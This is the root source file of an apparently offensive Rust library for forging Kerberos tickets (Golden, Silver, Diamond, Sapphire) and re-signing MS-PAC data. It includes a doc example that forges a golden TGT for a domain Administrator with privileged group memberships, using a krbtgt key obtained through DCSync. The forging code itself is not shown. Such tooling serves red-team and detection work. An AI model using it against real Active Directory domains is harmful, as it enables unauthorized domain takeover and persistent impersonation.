//! **ms-pac-forge** — MS-PAC marshaling + Golden/Silver Kerberos ticket
//! forgery in pure Rust. Extracted from adhammer.
//!
//! # Modules
//! - [`pac`] — PAC container parse + build (KERB_VALIDATION_INFO,
//!   CLIENT_INFO, ATTRIBUTES, REQUESTOR, SERVER/KDC signatures).
//! - [`forge`] — [`forge::forge_golden_tgt`] and [`forge::forge_silver_tgt`].
//! - [`checksum`] — RC4-HMAC (etype 23) + KERB_CHECKSUM_HMAC_MD5 (-138) used
//!   by RC4 forges. AES256 is provided by picky-krb.
//!
//! # Example
//! ```no_run
//! use ms_pac_forge::pac::ForgeIdentity;
//! use ms_pac_forge::forge::forge_golden_tgt;
//!
//! let id = ForgeIdentity {
//!     user: "Administrator".into(),
//!     rid: 500,
//!     primary_gid: 513,
//!     group_rids: vec![513, 512, 520, 518, 519],
//!     domain_subauths: vec![21, 1111111111, 2222222222, 3333333333],
//!     logon_server: "DC01".into(),
//!     logon_domain: "CORP".into(),
//!     ..Default::default()
//! };
//! let krbtgt_aes256 = [0x42u8; 32]; // from `dcsync krbtgt`
//! let tgt = forge_golden_tgt(&id, "CORP.LOCAL", &krbtgt_aes256, false).unwrap();
//! let _ = tgt.ticket_cipher();
//! ```
//!
//! 1.5.3 audit M-3: unsafe code forbidden, parity with kerbcore.

#![forbid(unsafe_code)]

/// Typed error for PAC marshaling + Kerberos ticket forgery. Replaces the
/// previous `anyhow::Error` public surface so callers can match specific
/// failure modes (wrong key vs malformed PAC vs encode failure).
#[derive(Debug, thiserror::Error)]
#[non_exhaustive]
pub enum PacForgeError {
    /// DER / PAC decode failure.
    #[error("{0}")]
    Decode(String),
    /// DER / PAC encode failure.
    #[error("{0}")]
    Encode(String),
    /// EncTicketPart decrypt failure (usually a wrong krbtgt / service key).
    #[error("{0}")]
    Decrypt(String),
    /// EncTicketPart encrypt failure.
    #[error("{0}")]
    Encrypt(String),
    /// PAC signature / checksum computation failure.
    #[error("{0}")]
    Signature(String),
    /// A required PAC buffer type was not present.
    #[error("PAC missing buffer type {0}")]
    MissingBuffer(u32),
    /// PAC truncated or a buffer offset ran past the blob.
    #[error("{0}")]
    Truncated(String),
    /// The ticket carried no authorization-data (no PAC to extract).
    #[error("ticket has no authorization-data (no PAC)")]
    NoAuthData,
    /// PAC version field was not 0.
    #[error("PAC version {0} != 0")]
    InvalidVersion(u32),
    /// Caller-supplied identity was invalid.
    #[error("{0}")]
    InvalidIdentity(String),
}

/// Result alias for ms-pac-forge operations.
pub type Result<T> = std::result::Result<T, PacForgeError>;

pub mod checksum;
pub mod diamond;
pub mod forge;
pub mod pac;
pub mod sapphire;
pub mod util;

pub use diamond::{build_diamond_ticket, forge_diamond_tgt};
pub use forge::{forge_golden_tgt, forge_silver_tgt, ForgedTicket};
pub use pac::{
    assemble_pac, build_kerb_validation_info, decrypt_ticket_pac_aes256, decrypt_ticket_pac_rc4,
    parse_pac, re_sign_pac, ForgeIdentity, PacBuf, ParsedPac,
};
pub use sapphire::{
    build_pa_for_user, extract_pac_from_enc_ticket_part, forge_sapphire_service_ticket,
    KEY_USAGE_S4U_CHECKSUM, PA_FOR_USER,
};
